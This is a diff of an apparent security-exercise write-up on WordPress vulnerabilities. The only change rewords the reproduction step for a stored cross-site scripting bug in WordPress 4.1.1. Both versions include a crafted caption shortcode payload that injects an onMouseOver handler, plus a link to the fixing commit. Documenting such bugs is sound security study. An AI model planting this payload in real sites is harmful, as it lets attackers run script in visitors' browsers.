@@ -13,7 +13,7 @@ Time spent: **4** hours spent in total
     - Tested in version: 4.1.1
     - Fixed in version: 4.3.1
   - [X] GIF Walkthrough: https://puu.sh/zK4da/f02dedf433.gif
-  - [X] Steps to recreate: Make a post with this code: ``` XSS Attack[caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">CLICK THIS</a> ``` and click the hyperlink while viewing the post.
+  - [X] Steps to recreate: Embed the following code into a post: ``` XSS Attack[caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">CLICK THIS</a> ``` and click the hyperlink while viewing the post.
   - [X] Affected source code: 
     - [Link 1](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)
 2. WordPress 3.7-4.4 - Authenticated Cross-Site Scripting
